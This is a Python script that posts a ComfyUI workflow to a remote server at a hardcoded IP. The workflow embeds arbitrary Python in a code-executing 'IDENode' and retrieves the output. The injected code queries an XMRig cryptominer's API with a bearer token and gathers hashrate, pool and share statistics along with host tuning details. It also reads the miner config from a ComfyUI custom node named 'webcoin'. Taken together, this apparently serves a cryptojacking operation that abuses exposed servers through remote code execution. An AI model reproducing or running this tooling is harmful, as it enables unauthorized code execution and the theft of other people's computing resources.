"""Query XMRig API with auth token to get full stats including hugepages."""
import json, urllib.request, time, sys

ip = sys.argv[1] if len(sys.argv) > 1 else "52.3.27.85"
port = sys.argv[2] if len(sys.argv) > 2 else "80"
base = f"http://{ip}:{port}"

CODE = r'''
import json, urllib.request

lines = []

# Query XMRig with auth token
try:
    req = urllib.request.Request(
        "http://127.0.0.1:44880/2/summary",
        headers={"Authorization": "Bearer ce_xm_2026", "Accept": "application/json"}
    )
    with urllib.request.urlopen(req, timeout=5) as resp:
        data = json.loads(resp.read())

    lines.append("=== XMRig Summary ===")
    lines.append(f"version: {data.get('version')}")
    lines.append(f"algo: {data.get('algo')}")
    lines.append(f"uptime: {data.get('uptime')}s")

    hr = data.get("hashrate", {})
    totals = hr.get("total", [])
    lines.append(f"hashrate_10s: {totals[0] if len(totals)>0 else 'N/A'}")
    lines.append(f"hashrate_60s: {totals[1] if len(totals)>1 else 'N/A'}")
    lines.append(f"hashrate_15m: {totals[2] if len(totals)>2 else 'N/A'}")
    lines.append(f"hashrate_max: {hr.get('highest')}")

    hp = data.get("hugepages", [])
    lines.append(f"hugepages: {hp}")

    cpu = data.get("cpu", {})
    lines.append(f"cpu_brand: {cpu.get('brand')}")
    lines.append(f"cpu_cores: {cpu.get('cores')}")
    lines.append(f"cpu_threads: {cpu.get('threads')}")
    lines.append(f"cpu_msr: {cpu.get('msr')}")
    lines.append(f"cpu_assembly: {cpu.get('assembly')}")
    lines.append(f"cpu_l3: {cpu.get('l3')}")

    res = data.get("resources", {})
    load = res.get("load_average", [])
    lines.append(f"load_average: {load}")

    conn = data.get("connection", {})
    lines.append(f"pool: {conn.get('pool')}")
    lines.append(f"accepted: {conn.get('accepted')}")
    lines.append(f"rejected: {conn.get('rejected')}")

    results = data.get("results", {})
    lines.append(f"shares_good: {results.get('shares_good')}")
    lines.append(f"shares_total: {results.get('shares_total')}")

except Exception as e:
    lines.append(f"XMRig API error: {e}")

# Check if hugepages are actually allocated at OS level
try:
    with open("/proc/meminfo") as f:
        for line in f:
            if "HugePages" in line or "Hugepagesize" in line:
                lines.append(f"meminfo: {line.strip()}")
except:
    lines.append("meminfo: cannot read /proc/meminfo")

# Check sysctl
import subprocess
try:
    r = subprocess.run(["sysctl", "vm.nr_hugepages"], capture_output=True, text=True, timeout=5)
    lines.append(f"sysctl: {r.stdout.strip()}")
except Exception as e:
    lines.append(f"sysctl: {e}")

# Check if MSR module is loaded
try:
    r = subprocess.run(["lsmod"], capture_output=True, text=True, timeout=5)
    msr_lines = [l for l in r.stdout.splitlines() if "msr" in l.lower()]
    lines.append(f"lsmod_msr: {msr_lines if msr_lines else 'NOT LOADED'}")
except Exception as e:
    lines.append(f"lsmod: {e}")

# Check if running in container
import os
lines.append(f"in_container: {os.path.exists('/.dockerenv') or os.path.exists('/run/.containerenv')}")

# Check effective nice value
try:
    nice = os.nice(0)
    lines.append(f"current_nice: {nice}")
except:
    pass

# Check ulimit
try:
    import resource
    soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
    lines.append(f"ulimit_nofile: soft={soft} hard={hard}")
except:
    pass

# Check XMRig config.json threads
try:
    import glob
    for p in glob.glob("/home/*/ComfyUI/custom_nodes/webcoin/bin/config.json") + \
             glob.glob("/root/ComfyUI/custom_nodes/webcoin/bin/config.json"):
        with open(p) as f:
            cfg = json.load(f)
        cpu_cfg = cfg.get("cpu", {})
        lines.append(f"cfg_max_threads_hint: {cpu_cfg.get('max-threads-hint')}")
        lines.append(f"cfg_priority: {cpu_cfg.get('priority')}")
        lines.append(f"cfg_yield: {cpu_cfg.get('yield')}")
        lines.append(f"cfg_huge_pages_jit: {cpu_cfg.get('huge-pages-jit')}")
        # Check if rx section exists (thread counts)
        rx = cpu_cfg.get("rx")
        if rx:
            lines.append(f"cfg_rx_threads: {rx}")
        break
except Exception as e:
    lines.append(f"config read error: {e}")

result = chr(10).join(lines)
'''

workflow_stub = {"workflow": {"nodes": [{"id": 1, "type": "IDENode"}, {"id": 2, "type": "PreviewTextNode"}]}}
prompt = {
    "prompt": {
        "1": {"class_type": "IDENode", "inputs": {"pycode": CODE, "language": "python"}},
        "2": {"class_type": "PreviewTextNode", "inputs": {"text": ["1", 0]}}
    },
    "extra_data": {"extra_pnginfo": workflow_stub}
}

body = json.dumps(prompt).encode()
req = urllib.request.Request(f"{base}/prompt", data=body,
                            headers={"Content-Type": "application/json"}, method="POST")
with urllib.request.urlopen(req, timeout=15) as r:
    data = json.loads(r.read().decode())
    pid = data.get("prompt_id")
    print(f"prompt_id: {pid}")

for attempt in range(12):
    time.sleep(5)
    try:
        req2 = urllib.request.Request(f"{base}/history/{pid}")
        with urllib.request.urlopen(req2, timeout=15) as r:
            entry = json.loads(r.read().decode()).get(pid, {})
            status = entry.get("status", {}).get("status_str", "pending")
            if status != "pending":
                print(f"Status: {status}\n")
                outputs = entry.get("outputs", {})
                for nid, nout in outputs.items():
                    for key, val in nout.items():
                        if isinstance(val, list):
                            for v in val:
                                print(v)
                break
    except Exception as e:
        print(f"poll error: {e}")
else:
    print("Still pending after 60s")
